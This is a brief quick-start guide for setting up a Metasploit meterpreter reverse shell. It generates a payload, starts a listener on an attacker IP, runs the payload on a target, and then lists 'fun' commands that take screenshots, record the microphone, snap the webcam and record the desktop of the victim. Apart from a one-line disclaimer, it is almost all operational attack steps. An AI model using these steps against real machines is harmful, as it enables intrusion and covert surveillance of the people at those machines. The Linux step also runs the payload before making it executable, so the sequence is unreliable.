# Metasploit Reverse Shell - Quick Start

**⚠️ Educational Use Only:** Only use on systems you own or have permission to test.

## Quick Setup on Kali Linux

### Step 1: Run the Automated Setup Script

```bash
bash setup_reverse_shell.sh
```

This will ask you for:
- Your attacker IP (LHOST)
- Listening port (default: 4444)
- Target OS (Windows or Linux)

The script generates:
- A meterpreter payload file (shell.exe or shell)
- An RC file to start the listener

### Step 2: Start the Listener

```bash
msfconsole -r /tmp/handler_setup_*.rc
```

Or let the script do it automatically—it will start the listener in the background and wait for a connection.

### Step 3: Execute on Target

On the target machine, run the generated payload:

**Windows:**
```powershell
.\shell.exe
```

**Linux:**
```bash
./shell
chmod +x shell
./shell
```

---

## 5 Fun Meterpreter Commands

Once you have a session, try these:

```
meterpreter > sysinfo                  # See what you're running on
meterpreter > screenshot               # Grab a screenshot of their screen
meterpreter > record_mic -d 10         # Record 10 seconds of microphone audio
meterpreter > webcam_snap -i 1         # Snap a photo from their webcam
meterpreter > record_desktop -d 10     # Record 10 seconds of their screen
```

---

**Last Updated:** 2026-09-21
